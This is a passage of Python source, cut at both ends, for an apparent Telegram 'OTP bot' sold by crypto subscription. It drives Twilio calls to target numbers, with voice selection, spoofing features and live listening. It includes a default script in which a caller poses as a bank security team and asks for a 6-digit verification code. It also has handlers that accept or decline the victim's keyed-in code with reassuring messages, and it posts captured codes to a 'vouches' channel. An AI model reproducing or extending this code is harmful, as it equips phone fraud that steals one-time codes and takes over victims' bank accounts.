                    machine_detection=True,
                )
                if not sid:
                    raise Exception("Failed to create custom call")
                store_call_metadata(user_id_str, sid)
                live_buttons = types.InlineKeyboardMarkup(row_width=1)
                live_buttons.add(types.InlineKeyboardButton("🎧 LIVE LISTEN", callback_data="live_listen"))
                bot.send_message(chat_id, "🎯 Custom call started. Tap LIVE LISTEN to open the monitoring panel.", reply_markup=live_buttons)

                try:
                    _http.post(
                        f"{LIVE_LISTEN_URL}/conversation/start",
                        json={"call_sid": sid, "chat_id": chat_id},
                        timeout=REQ_TIMEOUT,
                    )
                except Exception:
                    pass

                user_obj = types.User(id=call.from_user.id, is_bot=False, first_name=read_user_file(user_id_str, "Name.txt") or "User")
                report_twilio_call_status(chat_id, sid, user=user_obj)
            except Exception as e:
                bot.send_message(chat_id, f"❌ Failed to initiate custom call: {str(e)}")

        run_callback_async(_start_custom_call)
        return

    # --- Live Listen ---
    if call.data == "live_listen":
        send_live_listen_panel(chat_id, user_id_str)
        return

    # --- Call Status (show live listen / status) ---
    if call.data == "call_status":
        run_callback_async(send_live_listen_panel, chat_id, user_id_str)
        return

    # --- Download recording ---
    if call.data == "download_recording":
        recording_path = user_conf_path(user_id_str) / "record.mp3"
        if recording_path.exists() and recording_path.stat().st_size > 128:
            try:
                with open(recording_path, "rb") as f:
                    bot.send_audio(chat_id, f)
            except Exception as e:
                bot.send_message(chat_id, f"❌ Could not send recording: {e}")
        else:
            alt_path = user_conf_path(user_id_str) / f"{read_user_file(user_id_str, 'call_sid.txt', '')}.mp3"
            if alt_path.exists() and alt_path.stat().st_size > 128:
                try:
                    with open(alt_path, "rb") as f:
                        bot.send_audio(chat_id, f)
                    return
                except Exception as e:
                    bot.send_message(chat_id, f"❌ Could not send recording: {e}")
                    return
            bot.send_message(chat_id, "❌ No valid recording available yet.")
        return

    # --- Schedule menu ---
    if call.data == "schedule_menu":
        text = (
            "📅 <b>SCHEDULE A CALL</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Set a future call to a target number.\n"
            "Format: <code>+1234567890,DD/MM/YYYY,HH:MM</code>\n"
            "Example: <code>+1234567890,25/06/2026,14:30</code>\n\n"
            "Send the schedule line now."
        )
        set_user_state(user_id_str, "schedule_input")
        bot.send_message(chat_id, text, parse_mode="HTML")
        return

    # --- Support ---
    if call.data == "support":
        send_support_menu(chat_id, message_id)
        return

    # --- Channel ---
    if call.data == "channel":
        send_channel_menu(chat_id, message_id)
        return

    # --- Vouches ---
    if call.data == "vouches":
        send_vouches_menu(chat_id, message_id)
        return

    # --- AI Mode ---
    if call.data == "ai_mode" and not is_developer_user(user_id_str) and not is_developer_user(user_id_str):
        show_under_development_notice(chat_id, call.id, "AI Mode")
        return

    # --- Crack Blast ---
    # --- Analytics ---
    if call.data == "analytics":
        history = get_call_history(user_id_str)
        total = len(history)
        completed = sum(1 for h in history if h.get("status") == "completed")
        failed = total - completed
        rate = round(completed/total*100, 2) if total else 0
        text = f"📊 ANALYTICS\nTotal: {total}\nSuccessful: {completed}\nFailed: {failed}\nSuccess Rate: {rate}%"
        buttons = types.InlineKeyboardMarkup()
        buttons.add(types.InlineKeyboardButton("🔄 Refresh", callback_data="analytics"))
        buttons.add(types.InlineKeyboardButton("↩ Back", callback_data="back_to_menu"))
        bot.send_message(chat_id, text, reply_markup=buttons)
        return

    # --- Plan selection ---
    if call.data.startswith("plan_"):
        from menu import send_wallet_menu
        
        plans = {
            "plan_3hourtrial": ("3 Hour Trial", "$5"),
            "plan_1day": ("1 Day", "$16"),
            "plan_3days": ("3 Days", "$35"),
            "plan_1week": ("1 Week", "$70"),
            "plan_lifetime": ("Lifetime", "$195"),
        }
        plan_name, amount = plans.get(call.data, ("Unknown", "$0"))
        
        # Create verification request
        verification = create_verification_request(user_id_str, call.data, call.from_user.username)
        if not verification:
            bot.send_message(chat_id, "❌ Error creating verification request. Please try again.")
            return
        
        # Store verification ID in user state for later use
        set_user_state(user_id_str, f"payment_pending_{verification['verification_id']}")
        
        # Show wallet addresses with click-to-copy
        send_wallet_menu(chat_id, call.data, plan_name, amount)
        return

    # --- Copy wallet address (click-to-copy) ---
    if call.data.startswith("copy_wallet_"):
        currency = call.data.replace("copy_wallet_", "").upper()
        address = PAYMENT_ADDRESSES.get(currency, "")
        if address and not address.startswith("_your"):
            bot.answer_callback_query(
                call.id,
                f"✅ {currency} address copied to clipboard!",
                show_alert=False
            )
        else:
            bot.answer_callback_query(call.id, f"❌ {currency} address not configured.", show_alert=True)
        return

    # --- Verify payment (with plan_key) ---
    if call.data.startswith("verify_payment_"):
        plan_key = call.data.replace("verify_payment_", "")
        
        # Find the verification request
        verification = find_user_pending_verification(user_id_str)
        if not verification:
            bot.send_message(chat_id, "❌ No pending verification found. Please select a plan again.")
            return
        
        set_user_state(user_id_str, f"awaiting_proof_{verification['verification_id']}")
        bot.send_message(
            chat_id,
            "📥 <b>SUBMIT PAYMENT PROOF</b>\n\n"
            "Please send one of the following:\n"
            "• 📸 Screenshot of transaction\n"
            "• 🔗 Transaction hash/link\n"
            "• 📄 Document/receipt\n"
            "• ✍️ Payment confirmation text\n\n"
            "Your submission will be forwarded to our team for instant verification.",
            parse_mode="HTML"
        )
        return

    # --- Redeem premium key ---
    if call.data == "redeem_premium_key":
        set_user_state(user_id_str, "awaiting_premium_key")
        bot.send_message(chat_id, "🔑 Please send your premium key code now. It will be validated and applied instantly.", parse_mode="HTML")
        return

    # --- Key admin ---
    if call.data == "open_key_admin":
        if not is_privileged_user(user_id_str):
            bot.send_message(chat_id, "❌ Access denied.")
            return
        admin_text = (
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🔐 <b>PREMIUM KEY ADMIN</b>\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
            "Generate and manage premium keys for users.\n"
            "⏰ All keys have STRICT time allocation - tamper-proof.\n\n"
        )
        buttons = types.InlineKeyboardMarkup(row_width=1)
        buttons.add(types.InlineKeyboardButton("🔑 Generate 1 Day Key", callback_data="generate_key_1"))
        buttons.add(types.InlineKeyboardButton("🔑 Generate 3 Day Key", callback_data="generate_key_3"))
        buttons.add(types.InlineKeyboardButton("🔑 Generate 7 Day Key", callback_data="generate_key_7"))
        buttons.add(types.InlineKeyboardButton("🔑 Generate 30 Day Key", callback_data="generate_key_30"))
        buttons.add(types.InlineKeyboardButton("📋 List Unused Keys", callback_data="list_premium_keys"))
        buttons.add(types.InlineKeyboardButton("👥 VIEW USERS", callback_data="open_view_users"))
        buttons.add(types.InlineKeyboardButton("💬 MASS MESSAGE", callback_data="send_mass_message"))
        buttons.add(types.InlineKeyboardButton("✅ Approve Premium", callback_data="approve_premium_user"))
        buttons.add(types.InlineKeyboardButton("↩ Back", callback_data="account"))
        try:
            bot.edit_message_text(admin_text, chat_id, message_id, reply_markup=buttons, parse_mode="HTML")
        except:
            bot.send_message(chat_id, admin_text, reply_markup=buttons, parse_mode="HTML")
        return

    if call.data.startswith("generate_key_"):
        if not is_privileged_user(user_id_str):
            return
        days_map = {"generate_key_1": 1, "generate_key_3": 3, "generate_key_7": 7, "generate_key_30": 30}
        days = days_map.get(call.data, 1)
        key = generate_premium_key(days, user_id_str)
        bot.send_message(
            chat_id,
            f"✅ New premium key created:\n\n<code>{key['token']}</code>\n\nDuration: {days} day(s)\nUse this code in Account > Redeem Premium Key.",
            parse_mode="HTML",
        )
        return

    # --- Custom duration key generation ---
    if call.data == "custom_duration_key":
        if not is_privileged_user(user_id_str):
            bot.send_message(chat_id, "❌ Access denied.")
            return
        set_user_state(user_id_str, "admin_custom_duration_key")
        bot.send_message(chat_id, "Enter the number of days for the premium key:\n\nExample: 5, 10, 15, 90, 365")
        return

    # --- Custom free calls generation ---
    if call.data == "custom_free_calls_key":
        if not is_privileged_user(user_id_str):
            bot.send_message(chat_id, "❌ Access denied.")
            return
        set_user_state(user_id_str, "admin_custom_free_calls")
        bot.send_message(chat_id, "Enter the number of free calls to generate:\n\nExample: 10, 50, 100, 500")
        return

    # --- Key admin info ---
    if call.data == "key_admin_info":
        if not is_privileged_user(user_id_str):
            bot.send_message(chat_id, "❌ Access denied.")
            return
        info = (
            "🔐 <b>KEY ADMIN INFORMATION</b>\n\n"
            "<b>TAMPER-PROOF GUARANTEES:</b>\n"
            "• Time = EXACT allocation (no manipulation)\n"
            "• One-time use only\n"
            "• Permanent audit logs\n"
            "• Cannot be duplicated\n"
            "• System enforces all rules\n\n"
            "<b>HOW REDEMPTION WORKS:</b>\n"
            "1. User opens Account → Redeem Premium Key\n"
            "2. Pastes key code\n"
            "3. System validates:\n"
            "   - Key exists\n"
            "   - Key not used before\n"
            "   - Key format correct\n"
            "4. Premium time added (stacks with existing)\n"
            "5. Key marked as USED\n"
            "6. Audit log updated\n\n"
            "<b>KEY TYPES:</b>\n"
            "Premium: Timed subscription keys\n"
            "Free Calls: Custom call packages\n"
            "Loyalty: Auto-generated rewards\n\n"
            "<b>ADMIN CONTROLS:</b>\n"
            "Generate: Create preset or custom durations\n"
            "List: View all unused keys\n"
            "Track: See used keys in audit log\n"
        )
        bot.send_message(chat_id, info, parse_mode="HTML")
        return

    if call.data == "list_premium_keys":
        if not is_privileged_user(user_id_str):
            return
        keys = get_unused_premium_keys()
        if not keys:
            bot.send_message(chat_id, "ℹ️ No unused premium keys available.")
            return
        lines = [f"• <code>{k['token']}</code> — {k['days']} day(s) — created by {k['created_by']}" for k in keys]
        bot.send_message(chat_id, "🔑 <b>Unused Premium Keys</b>\n\n" + "\n".join(lines), parse_mode="HTML")
        return

    # --- Admin approve premium for user ---
    if call.data.startswith("admin_approve_"):
        if not is_privileged_user(user_id_str):
            bot.answer_callback_query(call.id, "❌ Access denied.", show_alert=True)
            return

        parts = call.data.split("_", 3)
        if len(parts) < 4:
            bot.answer_callback_query(call.id, "❌ Invalid approval action.", show_alert=True)
            return

        duration_key = parts[2]
        target_user_id = parts[3]
        success, expiry_str, display_duration, purchase_count, loyalty_gift_awarded, loyalty_key_token = apply_premium_subscription(target_user_id, duration_key)

        if not success:
            bot.answer_callback_query(call.id, "❌ Failed to approve premium. Check duration and try again.", show_alert=True)
            return

        admin_msg = (
            f"✅ <b>APPROVAL GRANTED</b>\n\n"
            f"👤 User ID: <code>{target_user_id}</code>\n"
            f"⏰ Duration: {display_duration}\n"
            f"📅 Expires: <code>{expiry_str}</code>\n"
            f"🛍️ Purchase Count: <code>{purchase_count}/5</code>\n"
        )
        if loyalty_gift_awarded and loyalty_key_token:
            admin_msg += (
                f"\n🎁 <b>LOYALTY GIFT AWARDED!</b>\n"
                f"🔑 Auto Key Generated: <code>{loyalty_key_token}</code>\n"
                f"📦 1-Day Premium Key (Auto)\n"
                f"🔄 Purchase counter reset to 0/5"
            )

        bot.answer_callback_query(call.id, "✅ Premium approved.", show_alert=False)
        bot.send_message(chat_id, admin_msg, parse_mode="HTML")

        user_confirmation = (
            f"✅ <b>PREMIUM APPROVED!</b>\n\n"
            f"🎉 Your payment has been verified and approved.\n\n"
            f"📋 <b>Premium Plan Details:</b>\n"
            f"⏰ <b>Duration:</b> {display_duration}\n"
            f"📅 <b>Expires:</b> <code>{expiry_str}</code>\n"
            f"🛍️ <b>Your Purchase Progress:</b> <code>{purchase_count}/5</code>\n\n"
        )
        if loyalty_gift_awarded and loyalty_key_token:
            user_confirmation += (
                f"🎁 <b>🎉 LOYALTY GIFT AWARDED! 🎉</b>\n\n"
                f"Congratulations on your 5th successful payment!\n\n"
                f"🔑 <b>FREE 1-DAY PREMIUM KEY (Auto-Generated):</b>\n"
                f"<code>{loyalty_key_token}</code>\n\n"
                f"✅ This key is automatically activated for 24 hours.\n"
                f"📌 No redemption needed - enjoy your free day!\n\n"
            )
        user_confirmation += (
            f"🚀 You now have full access to all premium features:\n"
            f"• Unlimited Fast Calls\n"
            f"• Full Spoofing Suite\n"
            f"• AI MODE V2\n"
            f"• Fast Response Engine\n"
            f"• And much more!\n\n"
            f"Thank you for your purchase! 🙏"
        )
        try:
            bot.send_message(int(target_user_id), user_confirmation, parse_mode="HTML")
        except Exception as e:
            logger.warning(f"Could not send confirmation to user {target_user_id}: {e}")
            bot.send_message(
                chat_id,
                f"⚠️ Approval granted, but could not send confirmation to user (they may have blocked the bot).",
            )
        return

    if call.data == "open_view_users":
        if not is_privileged_user(user_id_str):
            bot.send_message(chat_id, "❌ Access denied.")
            return
        
        # Get all users with their premium status from database
        users = get_all_users_with_status()
        if not users:
            bot.send_message(chat_id, "ℹ️ No users found.")
            return
        
        free_count, premium_count = get_free_vs_premium_count()
        total = len(users)
        
        # Create header with statistics
        header = f"""👥 <b>BOT USERS REPORT</b>
        
📊 <b>Statistics:</b>
  Total: {total}
  💎 Premium: {premium_count}
  📭 Free: {free_count}

<b>User List:</b>"""
        
        # Format user list with premium status and subscription dates
        lines = []
        for user in users:
            uid = user['user_id']
            status = user['status']
            sub_end = user['subscription_end']
            
            if status == "PREMIUM":
                icon = "💎"
                if sub_end != "-" and sub_end != "Unlimited":
                    lines.append(f"{icon} {uid} — PREMIUM (Expires: {sub_end})")
                else:
                    lines.append(f"{icon} {uid} — PREMIUM (Unlimited)")
            elif status == "EXPIRED":
                icon = "⏱️"
                lines.append(f"{icon} {uid} — EXPIRED (Was: {sub_end})")
            else:
                icon = "📭"
                lines.append(f"📭 <code>{uid}</code>")
        
        # Send in chunks to avoid message size limit
        max_lines = 25
        for start in range(0, len(lines), max_lines):
            chunk = lines[start:start + max_lines]
            if start == 0:
                msg = header + "\n\n" + "\n".join(chunk)
            else:
                msg = "\n".join(chunk)
            try:
                bot.send_message(chat_id, msg, parse_mode="HTML")
            except Exception as e:
                logger.error(f"Failed to send users list: {e}")
        
        # Add inline buttons for user management
        try:
            keyboard = types.InlineKeyboardMarkup()
            keyboard.add(types.InlineKeyboardButton("🔄 Refresh", callback_data="open_view_users"))
            keyboard.add(types.InlineKeyboardButton("⬅️ Back", callback_data="open_key_admin"))
            bot.send_message(chat_id, "\n👇 Choose an action:", reply_markup=keyboard)
        except:
            pass
        
        return

    # --- Approve premium for user ---
    if call.data == "approve_premium_user":
        if not is_privileged_user(user_id_str):
            bot.send_message(chat_id, "❌ Access denied.")
            return
        
        set_user_state(user_id_str, "admin_approve_premium_step1")
        bot.send_message(
            chat_id,
            "👤 <b>APPROVE PREMIUM FOR USER</b>\n\n"
            "Step 1: Send the user ID to approve.\n"
            "Example: <code>123456789</code>",
            parse_mode="HTML"
        )
        return

    # --- Send mass message to all users ---
    if call.data == "send_mass_message":
        if not is_privileged_user(user_id_str):
            bot.send_message(chat_id, "❌ Access denied.")
            return
        
        set_user_state(user_id_str, "admin_mass_message_input")
        bot.send_message(
            chat_id,
            "📢 <b>BROADCAST MESSAGE TO ALL USERS</b>\n\n"
            "Send your message now. It will be delivered to all users who have interacted with the bot.\n\n"
            "<i>Tip: You can use HTML formatting:</i>\n"
            "• <b>Bold</b> with &lt;b&gt;text&lt;/b&gt;\n"
            "• <i>Italic</i> with &lt;i&gt;text&lt;/i&gt;\n"
            "• <code>Monospace</code> with &lt;code&gt;text&lt;/code&gt;\n\n"
            "Type your message:",
            parse_mode="HTML"
        )
        return

    # --- Confirm and send mass message to all users ---
    if call.data == "confirm_mass_send":
        if not is_privileged_user(user_id_str):
            bot.send_message(chat_id, "❌ Access denied.")
            return
        
        # Get the message text from file
        message_text = read_user_file(user_id_str, "mass_message_text.txt")
        if not message_text:
            bot.send_message(chat_id, "❌ Message not found. Please try again.")
            clear_user_state(user_id_str)
            return
        
        # Get all users
        users = get_all_users_with_status()
        if not users:
            bot.send_message(chat_id, "ℹ️ No users found to send message to.")
            clear_user_state(user_id_str)
            return
        
        # Send message to each user in background thread
        def send_mass_messages():
            successful = 0
            failed = 0
            failed_users = []
            
            for user in users:
                try:
                    bot.send_message(
                        int(user['user_id']),
                        message_text,
                        parse_mode="HTML"
                    )
                    successful += 1
                    time.sleep(0.1)  # Small delay to avoid hitting rate limits
                except Exception as e:
                    failed += 1
                    failed_users.append(user['user_id'])
                    logger.warning(f"Failed to send mass message to {user['user_id']}: {e}")
            
            # Send report back to admin
            report = f"""📊 <b>MASS MESSAGE DELIVERY REPORT</b>

✅ Successfully sent: {successful}
❌ Failed: {failed}
📊 Total: {len(users)}

Success rate: {round((successful/len(users)*100), 1)}%"""
            
            if failed_users and failed < 20:
                report += f"\n\nFailed users:\n" + ", ".join(failed_users[:20])
                if len(failed_users) > 20:
                    report += f"\n... and {len(failed_users) - 20} more"
            
            try:
                bot.send_message(chat_id, report, parse_mode="HTML")
            except:
                pass
        
        # Send status message
        bot.send_message(chat_id, "📨 Sending messages to all users... This may take a few moments.")
        
        # Run in background thread to avoid blocking
        threading.Thread(target=send_mass_messages, daemon=True).start()
        
        # Clear state and close menu
        clear_user_state(user_id_str)
        return

    # --- Cancel mass message ---
    if call.data == "cancel_mass_send":
        if not is_privileged_user(user_id_str):
            bot.send_message(chat_id, "❌ Access denied.")
            return
        
        clear_user_state(user_id_str)
        bot.send_message(chat_id, "❌ Mass message cancelled.")
        send_main_menu(chat_id, call.from_user)
        return

    # --- Voice selection callback ---
    if call.data.startswith("voice_select_"):
        voice_id = call.data.replace("voice_select_", "")
        name = next((v["name"] for v in VOICE_MAPPING.values() if v["id"] == voice_id), None)
        if name:
            state = get_user_state(user_id_str)
            if state == "crack_blast_step_4_voice":
                write_user_file(user_id_str, "crack_voice_id.txt", voice_id)
                write_user_file(user_id_str, "crack_voice_name.txt", name)
                set_user_state(user_id_str, "crack_blast_step_5_digits")
                bot.answer_callback_query(call.id, f"Crack Blast voice selected: {name}")
                try:
                    from menu_utils import build_voice_selection_keyboard
                    keyboard = build_voice_selection_keyboard(VOICE_MAPPING, voice_id, "voice_select_")
                    bot.edit_message_reply_markup(chat_id, message_id, reply_markup=keyboard)
                except ImportError:
                    pass
                bot.send_message(chat_id, "💠 Step 5/7: DTMF digits\nHow many digits should the bot collect? Reply 0 for none.")
                return

            if state == "manual_call_step_4_voice":
                write_user_file(user_id_str, "manual_voice_id.txt", voice_id)
                write_user_file(user_id_str, "manual_voice_name.txt", name)
                set_user_state(user_id_str, "manual_call_step_5_digits")
                bot.answer_callback_query(call.id, f"Manual call voice selected: {name}")
                try:
                    from menu_utils import build_voice_selection_keyboard
                    keyboard = build_voice_selection_keyboard(VOICE_MAPPING, voice_id, "voice_select_")
                    bot.edit_message_reply_markup(chat_id, message_id, reply_markup=keyboard)
                except ImportError:
                    pass
                bot.send_message(chat_id, "💠 Step 5/8: DTMF Capture\nHow many digits should the bot collect? Reply 0 for none.")
                return

            if state == "custom_call_step_5_voice":
                write_user_file(user_id_str, "custom_voice_id.txt", voice_id)
                write_user_file(user_id_str, "custom_voice_name.txt", name)
                set_user_state(user_id_str, "custom_call_step_6_digits")
                bot.answer_callback_query(call.id, f"Custom call voice selected: {name}")
                try:
                    from menu_utils import build_voice_selection_keyboard
                    keyboard = build_voice_selection_keyboard(VOICE_MAPPING, voice_id, "voice_select_")
                    bot.edit_message_reply_markup(chat_id, message_id, reply_markup=keyboard)
                except ImportError:
                    pass
                bot.send_message(chat_id, "💠 Step 6/8: Delay Before Speaking\nEnter delay in seconds (0-10).")
                return

            if state == "normal_call_step_9_voice":
                # Accept the voice selection and hand off to the compatibility preview/confirm UI
                try:
                    write_user_file(user_id_str, "Voice.txt", voice_id)
                    write_user_file(user_id_str, "VoiceName.txt", name)
                    bot.answer_callback_query(call.id, f"Voice selected: {name}")
                    import handlers.call_flow as cf
                    cf.init_bot(bot)
                    # Show the preview/confirm panel implemented in the compatibility layer
                    cf.show_preview_and_confirm_compat(chat_id, user_id_str)
                except Exception:
                    # Fallback to legacy reply_markup update
                    try:
                        write_user_file(user_id_str, "Voice.txt", voice_id)
                        write_user_file(user_id_str, "VoiceName.txt", name)
                        bot.answer_callback_query(call.id, f"Voice selected: {name}")
                        from menu_utils import build_voice_selection_keyboard
                        keyboard = build_voice_selection_keyboard(VOICE_MAPPING, voice_id, "voice_select_")
                        bot.edit_message_reply_markup(chat_id, message_id, reply_markup=keyboard)
                    except Exception:
                        pass
                return

            write_user_file(user_id_str, "Voice.txt", voice_id)
            write_user_file(user_id_str, "VoiceName.txt", name)
            bot.answer_callback_query(call.id, f"Voice selected: {name}")
            try:
                from menu_utils import build_voice_selection_keyboard
                keyboard = build_voice_selection_keyboard(VOICE_MAPPING, voice_id, "voice_select_")
                bot.edit_message_reply_markup(chat_id, message_id, reply_markup=keyboard)
            except ImportError:
                pass
            return
        bot.answer_callback_query(call.id, "Voice selection not recognized.", show_alert=True)
        return

    # --- OTP accept/decline callbacks ---
    if call.data.startswith("send_otp_"):
        call_sid = call.data.split("_")[2]
        bot.answer_callback_query(call.id)
        bot.send_message(chat_id, "📲 OTP request sent to target service. Waiting for user input...")
        return

    if call.data.startswith("otp_accept_"):
        parts = call.data.split("_")
        call_sid = parts[2]
        digits = parts[3]
        bot.answer_callback_query(call.id, "✅ Code accepted. Caller will hear success message.")
        bot.send_message(chat_id, f"✅ Code Verification ACCEPTED\nCall Finished → Call completed successfully.")
        log_otp(call_sid, digits, status="accepted")
        cancel_otp_timer(call_sid)
        session = call_sessions.get(call_sid)
        if session is not None:
            session["otp_status"] = "accepted"
        target_user_id = session.get("user_id") if session else user_id_str

        def _post_vouch():
            post_vouch_to_channel(call_sid, target_user_id, digits)
        threading.Thread(target=_post_vouch, daemon=True).start()

        voice_id_accept, _ = get_call_voice_info(call_sid, target_user_id)
        try:
            client = twilio_client or get_twilio_client()
            if client:
                resp = VoiceResponse()
                say_done = "We have successfully verified your account. No further action is needed at this time. We apologize for any inconvenience and thank you for being a loyal customer. Goodbye."
                audio_done = generate_call_audio(user_id=target_user_id, text=say_done, voice_id=voice_id_accept, filename="otp_accepted.mp3")
                if audio_done:
                    resp.play(audio_done)
                else:
                    resp.say(say_done)
                resp.hangup()
                client.calls(call_sid).update(twiml=str(resp))
        except Exception as e:
            logger.warning(f"Failed to update Twilio on OTP accept: {e}")
        return

    if call.data.startswith("otp_decline_"):
        parts = call.data.split("_")
        call_sid = parts[2]
        digits = parts[3]
        bot.answer_callback_query(call.id, "❌ Code declined. Caller will hear failure message.")
        cancel_otp_timer(call_sid)
        session = call_sessions.get(call_sid)
        if session is not None:
            session["otp_status"] = "declined"
            session["otp_attempts"] = session.get("otp_attempts", 0) + 1
        attempts = session.get("otp_attempts", 0) if session else 0
        log_otp(call_sid, digits, status="declined")
        target_user_id = session.get("user_id") if session else user_id_str
        voice_id_decline, _ = get_call_voice_info(call_sid, target_user_id)
        try:
            client = twilio_client or get_twilio_client()
            if client:
                resp = VoiceResponse()
                if attempts >= 3:
                    say_fail = "Too many failed attempts. Your account is locked. Please contact support."
                    audio_fail = generate_call_audio(user_id=target_user_id, text=say_fail, voice_id=voice_id_decline, filename="otp_locked.mp3")
                    if audio_fail:
                        resp.play(audio_fail)
                    else:
                        resp.say(say_fail)
                    resp.hangup()
                else:
                    say_try = "The code was incorrect. Please try again."
                    audio_try = generate_call_audio(user_id=target_user_id, text=say_try, voice_id=voice_id_decline, filename="otp_retry.mp3")
                    if audio_try:
                        resp.play(audio_try)
                    else:
                        resp.say(say_try)
                    resp.redirect(
                        f"/capture_otp?user_id={quote_plus(str(target_user_id))}"
                        f"&chat_id={quote_plus(str(chat_id or 'unknown'))}&stage=otp"
                    )
                client.calls(call_sid).update(twiml=str(resp))
        except Exception as e:
            logger.warning(f"Failed to update Twilio on OTP decline: {e}")
        bot.send_message(chat_id, f"❌ Code Verification DECLINED{' — final attempt reached' if attempts >= 3 else ''}")
        return

    # --- Fallback ---
    bot.send_message(chat_id, "ℹ️ Unknown command. Use /start to return.")

# ======================================================================
# REPORT TWILIO CALL STATUS (non-blocking, faster)
# ======================================================================
def _report_twilio_call_status(chat_id: int, sid: str, user: Optional[types.User] = None, max_checks: int = 4, interval: int = 3) -> Optional[str]:
    if not sid:
        logger.warning("Skipping Twilio status polling because CallSid is missing")
        return None
    last_status = None
    status = None
    for _ in range(max_checks):
        try:
            status = twilio_client.calls(sid).fetch().status
        except Exception as e:
            logger.warning(f"Status check exception for CallSid={sid}: {e}", exc_info=True)
            try:
                bot.send_message(chat_id, f"❌ Status check error: {str(e)[:120]}")
            except Exception:
                pass
            return None

        if status in ["completed", "failed", "no-answer", "busy", "canceled"]:
            break
        time.sleep(interval)

    if status == "completed":
        try:
            _download_recording(chat_id, sid, str(user.id) if user else None)
        except Exception:
            try:
                bot.send_message(chat_id, "✅ Call completed")
            except Exception:
                pass
    elif status == "failed":
        try:
            bot.send_message(chat_id, "❌ Call failed.")
        except Exception:
            pass
    elif status == "no-answer":
        try:
            bot.send_message(chat_id, "⏱️ No answer.")
        except Exception:
            pass
    elif status == "canceled":
        try:
            bot.send_message(chat_id, "ℹ️ Call canceled.")
        except Exception:
            pass
    elif status == "busy":
        try:
            bot.send_message(chat_id, "ℹ️ Line busy.")
        except Exception:
            pass

    if user:
        time.sleep(1)
        try:
            send_call_complete_menu(chat_id)
        except Exception:
            pass
    return status


def report_twilio_call_status(chat_id: int, sid: str, user: Optional[types.User] = None, max_checks: int = 4, interval: int = 3) -> threading.Thread:
    thread = threading.Thread(
        target=_report_twilio_call_status,
        args=(chat_id, sid, user, max_checks, interval),
        daemon=True,
    )
    thread.start()
    return thread

def _download_recording(chat_id: int, sid: str, user_id: Optional[str] = None):
    recordings = twilio_client.calls(sid).recordings.list(limit=1)
    if not recordings:
        bot.send_message(chat_id, "✅ Call completed. No recording available.")
        return
    recording = recordings[0]
    recording_uri = recording.uri.replace(".json", ".mp3")
    r = _http.get(
        f"https://api.twilio.com{recording_uri}",
        auth=HTTPBasicAuth(ACCOUNT_SID, AUTH_TOKEN),
        timeout=REQ_TIMEOUT
    )
    record_dir = ensure_user_path(user_id) if user_id else None
    if record_dir and r.status_code == 200 and r.content:
        if len(r.content) < 128:
            bot.send_message(chat_id, "⚠️ Recording download completed but file appears too small. No audio sent.")
            logger.warning(f"Recording too small for CallSid={sid}: {len(r.content)} bytes")
            return
        record_path = record_dir / "record.mp3"
        call_path = record_dir / f"{sid}.mp3"
        record_path.write_bytes(r.content)
        call_path.write_bytes(r.content)
        bot.send_message(chat_id, "✅ Call completed. Recording saved.")
        try:
            with open(record_path, "rb") as f:
                bot.send_audio(chat_id, f)
        except Exception as e:
            logger.warning(f"Failed to send completed recording: {e}")
            bot.send_message(chat_id, "⚠️ Recording saved but could not send audio to chat.")
    else:
        bot.send_message(chat_id, "✅ Call completed. Recording saved (no user_id) or recording unavailable.")

# ======================================================================
# FORMAT PAYMENT ADDRESSES
# ======================================================================
def format_payment_addresses(addresses: dict) -> str:
    if not addresses:
        return "No payment addresses configured. Please contact support."
    lines = []
    mapping = {
        "BTC": "Bitcoin",
        "ETH": "Ethereum",
        "LTC": "Litecoin",
        "USDT_ERC20": "USDT (ERC20)",
    }
    for key in ["BTC", "ETH", "LTC", "USDT_ERC20"]:
        value = addresses.get(key)
        if value:
            lines.append(f"• {mapping[key]}: `{value}`")
    return "\n".join(lines) if lines else "No payment addresses configured."

# ======================================================================
# SQLITE SCRIPTS HELPERS (with feedback)
# ======================================================================
DEFAULT_SCRIPT_LIBRARY = [
    (
        "Normal Call Default Script",
        """[GREETING]\nHello, this is the security team calling from your bank. Am I speaking with the account holder?\n\nWe are calling to verify a recent activity on your account and ensure everything is secure.\n\n[PAUSE_WAIT:1]\nFor your protection, please press 1 to continue.\n\n[GATHER:digits=6]\nA verification code has been sent to your registered phone number. Enter the 6-digit code now, then press the pound key (#).\n\n[SUCCESS]\nThank you. Your account is verified and secure. Goodbye.\n\n[FAILURE]\nThe code did not match our records. Please try again or contact support if you need help."""
    ),
]

def get_db_path(user_id_str: str) -> Path:
    return user_conf_path(user_id_str) / "scripts.db"

def init_user_db(user_id_str: str) -> None:
    ensure_user_path(user_id_str)
    try:
        conn = sqlite3.connect(get_db_path(user_id_str))
        conn.execute("""
            CREATE TABLE IF NOT EXISTS scripts (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id TEXT NOT NULL,
                name TEXT,
                content TEXT NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        """)
        conn.commit()
        cols = [row[1] for row in conn.execute("PRAGMA table_info(scripts)").fetchall()]
        if "name" not in cols:
            conn.execute("ALTER TABLE scripts ADD COLUMN name TEXT")
            conn.commit()
        for name, content in DEFAULT_SCRIPT_LIBRARY:
            conn.execute("INSERT OR IGNORE INTO scripts (user_id, name, content) VALUES (?, ?, ?)", ("0", name, content))
        conn.commit()
        conn.close()
        logger.info(f"Scripts DB initialized for user {user_id_str}")
    except Exception as e:
        logger.error(f"DB init error: {e}")

def db_add_script(user_id_str: str, name: str, content: str) -> bool:
    init_user_db(user_id_str)
    try:
        conn = sqlite3.connect(get_db_path(user_id_str))
        conn.execute("INSERT INTO scripts (user_id, name, content) VALUES (?, ?, ?)", (user_id_str, name.strip() or "Untitled Script", content.strip()))
        conn.commit()
        conn.close()
        logger.info(f"Script added for user {user_id_str}")
        return True
    except Exception as e:
        logger.error(f"DB add error: {e}")
        return False

def db_get_script_rows(user_id_str: str) -> List[Dict[str, Any]]:
    path = get_db_path(user_id_str)
    # Ensure DB exists and is initialized so callers always receive defaults
    if not path.exists():
        try:
            init_user_db(user_id_str)
        except Exception:
            return []
    try:
        conn = sqlite3.connect(path)
        default_count = conn.execute("SELECT COUNT(*) FROM scripts WHERE user_id = '0'").fetchone()[0]
        if default_count != len(DEFAULT_SCRIPT_LIBRARY):
            conn.execute("DELETE FROM scripts WHERE user_id = '0'")
